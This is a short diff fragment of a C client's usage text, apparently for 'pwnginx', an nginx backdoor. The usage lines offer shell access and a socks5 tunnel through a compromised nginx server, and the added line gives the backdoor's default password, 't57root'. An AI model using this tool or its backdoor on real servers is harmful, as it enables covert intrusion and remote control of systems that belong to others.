@@ -36,6 +36,7 @@ int main(int argc,char **argv)
     "Usage:\n"
     "Get a shell access via the nginx running @ [ip]:[port]\n\t%s shell [ip] [port] [password]\n"
     "Get a socks5 tunnel listening at [socks5ip]:[socks5port]\n\t%s socks5 [ip] [port] [password] [socks5ip] [socks5port]\n"
+    "password: default is t57root, defined in pwnginx/module/config.h\n"
     ,argv[0],argv[0]);
     char *action = argv[1];
     ip = argv[2];
